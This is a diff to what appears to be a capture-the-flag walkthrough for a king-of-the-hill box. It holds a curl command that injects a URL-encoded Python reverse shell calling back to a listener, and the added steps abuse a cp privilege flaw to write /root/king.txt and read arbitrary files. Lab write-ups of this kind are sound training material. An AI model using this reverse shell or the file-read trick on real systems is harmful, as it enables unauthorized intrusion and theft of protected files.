@@ -68,7 +68,16 @@ This machine is race to root kind of thing, There is a very low hanging fruit to
    
         curl "<REMOTE_IP>:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<LOCAL_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"
 
-
+    On listener, you can see that we have a shell now.<br />
+   
+ 4. After trying a lot of tests and linPEAS, I found that the easiest method to get king AND root shell is to exploit the `cp` vulnerability on the box. I am leaving the ideas to you for this one, but after making you king.<br />
+ 
+    `LFILE=/root/king.txt`<br />
+    `echo "<YOUR USERNAME>" | cp /dev/stdin "$LFILE"`<br />
+YOU ARE ROOT. NOW DEFEND YOUR TITILE.<br />
+Free Tip: (You know you can read anyfile with this vuln, use your imagination.)<br />
+    `LFILE=file_to_read`<br />
+    `cp "$LFILE" /dev/stdout`<br />
 
 
 
